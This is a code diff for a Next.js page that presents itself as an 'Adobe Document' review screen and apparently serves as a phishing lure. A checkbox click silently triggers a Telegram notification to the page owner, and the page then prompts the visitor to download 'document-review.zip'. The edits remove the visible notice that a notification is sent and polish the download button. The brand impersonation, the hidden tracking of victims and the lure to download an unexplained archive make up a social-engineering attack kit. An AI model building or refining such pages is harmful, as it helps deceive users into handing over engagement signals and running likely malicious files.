@@ -1,7 +1,6 @@
 "use client";
 
 import { useEffect, useRef, useState } from "react";
-import Image from "next/image";
 
 const NOTIFICATION_URL = "/api/send-telegram";
 const DOCUMENT_URL = "/document-review.zip";
@@ -87,6 +86,7 @@ export default function Home() {
     useState<NotificationStatus>("idle");
 
   const [documentVisible, setDocumentVisible] = useState(false);
+  const [downloadStarted, setDownloadStarted] = useState(false);
 
   const notificationStarted = useRef(false);
   const titleRef = useRef<HTMLHeadingElement>(null);
@@ -153,13 +153,16 @@ export default function Home() {
     notificationStarted.current = true;
     setCheckStatus("checking");
 
-    // Send immediately when clicked, independently of the animation.
+    // Starts immediately; delivery does not block the animation.
     void notifyOwner();
   }
 
   return (
     <div className="relative isolate flex h-screen h-[100dvh] flex-col overflow-hidden bg-[#26070D] font-sans text-white selection:bg-rose-300/30">
-       <div className="pointer-events-none fixed inset-0 -z-10 overflow-hidden">
+      <div
+        aria-hidden="true"
+        className="pointer-events-none absolute inset-0 -z-10 overflow-hidden"
+      >
         <div className="absolute inset-0 bg-gradient-to-br from-[#8B1020] via-[#4B0B16] to-[#17060A]" />
 
         <div className="absolute -left-32 -top-32 h-[500px] w-[500px] rounded-full bg-red-600/40 blur-[130px]" />
@@ -172,25 +175,22 @@ export default function Home() {
       </div>
 
       <header className="shrink-0 border-b border-white/15 bg-white/5 backdrop-blur-xl">
-      
-        <div className="mx-auto flex h-16 w-full max-w-6xl items-center gap-4 px-8 sm:px-8">
-          <img src="/adobe.png" alt="" className="h-7 w-7" />
-          
+        <div className="mx-auto flex h-16 w-full max-w-6xl items-center justify-between px-5 sm:px-8">
           <a
             href="/"
             aria-label="Document Space home"
             className="flex items-center gap-3 rounded-md focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-4 focus-visible:outline-white"
           >
-            
+           <img src="/adobe.png" alt="" className="h-7 w-7" />
+
             <span className="text-sm font-semibold tracking-tight">
-             Adobe Document 
+              Adobe Document
             </span>
           </a>
 
-          
-
-
-        
+          <span className="rounded-full border border-white/15 px-3 py-1 text-[10px] tracking-wide text-white/60">
+            Document Review
+          </span>
         </div>
       </header>
 
@@ -248,7 +248,9 @@ export default function Home() {
                       {checkStatus === "complete" && <CheckIcon />}
                     </span>
 
-                    
+                    <span className="text-[13px]">
+                      Confirm
+                    </span>
                   </label>
 
                   <span
@@ -267,7 +269,7 @@ export default function Home() {
                   className="mt-3 min-h-5 text-xs text-white/70"
                 >
                   {checkStatus === "idle"
-                    ? "Select the checkbox"
+                    ? "Select the checkbox."
                     : checkStatus === "checking"
                       ? "Confirming your selection…"
                       : "Complete. You may now continue."}
@@ -286,23 +288,6 @@ export default function Home() {
                   Continue
                   <ArrowIcon />
                 </button>
-
-              
-
-                <p
-                  role="status"
-                  aria-live="polite"
-                  aria-atomic="true"
-                  className="mt-3 min-h-4 text-center text-[10px] text-white/50"
-                >
-                  {notificationStatus === "sending"
-                    ? "Sending notification…"
-                    : notificationStatus === "sent"
-                      ? ""
-                      : notificationStatus === "failed"
-                        ? "Notification unavailable. You can still continue."
-                        : ""}
-                </p>
               </>
             ) : (
               <>
@@ -313,21 +298,22 @@ export default function Home() {
 
                 </div>
 
-                <h2 className="text-lg font-medium tracking-tight">
-                  Document for review
-                </h2>
+                <p className="mt-2 text-xs leading-5 text-white/60">
+                  Your document is ready. Use the button below to download it.
+                </p>
 
                 <div className="my-5 h-px bg-white/15" />
 
-                <a
-                  href={DOCUMENT_URL}
-                  target="_blank"
-                  rel="noopener noreferrer"
-                  className="flex w-full items-center justify-center gap-3 rounded-lg bg-white px-4 py-3 text-sm font-semibold text-[#790D19] transition-colors hover:bg-rose-50 focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-4 focus-visible:outline-white"
-                >
-                  Download Document
-                  <ArrowIcon />
-                </a>
+               <a
+  href={DOCUMENT_URL}
+  target="_blank"
+  rel="noopener noreferrer"
+  onClick={() => setDownloadStarted(true)}
+  className="flex w-full items-center justify-center gap-3 rounded-lg bg-white px-4 py-3 text-sm font-semibold text-[#790D19] transition-colors hover:bg-rose-50 focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-4 focus-visible:outline-white"
+>
+  {downloadStarted ? "Downloaded" : "Download Document"}
+  {downloadStarted ? <CheckIcon /> : <ArrowIcon />}
+</a>
               </>
             )}
           </div>
@@ -335,7 +321,7 @@ export default function Home() {
       </main>
 
       <footer className="shrink-0 border-t border-white/10 bg-white/5 px-5 py-4 text-center text-[10px] text-white/50 backdrop-blur-xl">
-        Adobe Document 
+        Adobe Document @2026
       </footer>
     </div>
   );
